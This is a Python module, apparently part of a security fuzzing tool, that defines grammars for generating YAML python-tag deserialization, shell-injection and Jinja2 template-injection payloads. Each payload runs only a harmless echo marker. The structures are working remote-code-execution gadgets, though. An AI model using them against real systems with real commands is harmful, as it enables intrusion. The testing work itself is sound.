"""Grammars for the structurally-rich sink families.

Each grammar is a :class:`~arbiter.mutators.grammar.Rule` whose cross-product
yields structurally-valid attack payloads. The mutator's family-extender
delegates to :func:`enumerate_rule` rather than hand-coding variants.

To extend a family, add a `Choice` option here and the cross-product will
pick it up automatically.
"""

from __future__ import annotations

from arbiter.mutators.grammar import Choice, Rule

# --- deserialization (YAML python-tag injection) -----------------------------
# Cross-product:
#   tags(4) × callables(6) × bodies(2) = 48 payloads
#
# Every yielded payload is a syntactically valid YAML python-tag construction
# whose marker lands in the called function's argument and surfaces in the
# audit-event args repr.
DESERIALIZATION = Rule((
    "!!python/",
    Choice((
        "object/apply",
        "object/new",
    )),
    ":",
    Choice((
        "os.system",
        "subprocess.getoutput",
        "subprocess.call",
        "os.popen",
        "builtins.eval",
        "builtins.exec",
    )),
    " ",
    Choice((
        # Flow form
        '["echo {MARKER}"]',
        # Block form (newline-separated)
        '\n- "echo {MARKER}"',
    )),
))

# --- process (shell injection) -----------------------------------------------
# Cross-product:
#   prefixes(7) × payloads(2) × suffixes(3) = 42 payloads
#
# Covers separator-style injection (`; cmd`, `&& cmd`), command substitution
# (`$(cmd)`, backticks), newline-injection, and quote-escape patterns.
PROCESS = Rule((
    Choice((
        "",            # plain
        "; ",          # separator
        "&& ",
        "|| ",
        "| ",
        "\n",          # newline-injection
        "\t",
    )),
    Choice((
        "echo {MARKER}",
        "true && echo {MARKER}",
    )),
    Choice((
        "",                    # bare
        " #",                  # comment-suppress trailing
        "\n",                  # trailing newline
    )),
))

# Additional process patterns that don't fit the linear "prefix-payload-suffix"
# shape: command substitution and quote-escape.
PROCESS_SUBST = Choice((
    Rule(("$(echo {MARKER})",)),
    Rule(("`echo {MARKER}`",)),
    Rule(('"; echo {MARKER}; "',)),
    Rule(("'; echo {MARKER}; '",)),
))

# --- template (Jinja2 / Mako SSTI) -------------------------------------------
# Two strategies live in this grammar:
#   1. Literal embedding — marker as a Python string in the template body
#   2. Globals-chain RCE gadgets — `cycler.__init__.__globals__.os.popen(...)`
#
# Cross-product:
#   literal_form(4) + globals_chain(4 walkers × 1 op) = 8 payloads
TEMPLATE = Choice((
    # Literal embeddings
    Rule(("{{ '{MARKER}' }}",)),
    Rule(("{{ '{MARKER}'.upper() }}",)),
    Rule(("{% set x = '{MARKER}' %}{{ x }}",)),
    Rule(("{% if 1 %}{MARKER}{% endif %}",)),
    # Globals-chain RCE (one rule per walker; the operation is uniform)
    Rule((
        "{{ ",
        Choice((
            "cycler.__init__.__globals__",
            "joiner.__init__.__globals__",
            "namespace.__init__.__globals__",
            "lipsum.__globals__",
        )),
        ".os.popen('echo {MARKER}').read() }}",
    )),
))


__all__ = ["DESERIALIZATION", "PROCESS", "PROCESS_SUBST", "TEMPLATE"]
